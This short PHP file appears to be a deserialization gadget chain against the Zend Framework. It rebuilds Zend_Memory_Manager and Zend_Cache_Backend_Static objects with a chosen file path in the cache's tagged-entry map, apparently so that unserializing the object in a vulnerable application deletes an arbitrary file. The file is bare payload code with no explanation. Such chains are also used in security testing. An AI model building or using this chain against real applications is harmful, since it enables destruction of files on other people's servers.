<?php

class Zend_Memory_Manager
{
    private $_backend;
    private $_tags;

    public function __construct($remote_path) 
    {
        $this->_backend = new \Zend_Cache_Backend_Static($remote_path);
        $this->_tags = ["x"];
    }
}

class Zend_Cache_Backend_Static
{
    protected $_tagged;
    protected $_options=['public_dir'=>''];
    
    public function __construct($remote_path) 
    {
        $this->_tagged = [$remote_path=>["tags"=>["x"],"extension"=>""]];
    }
}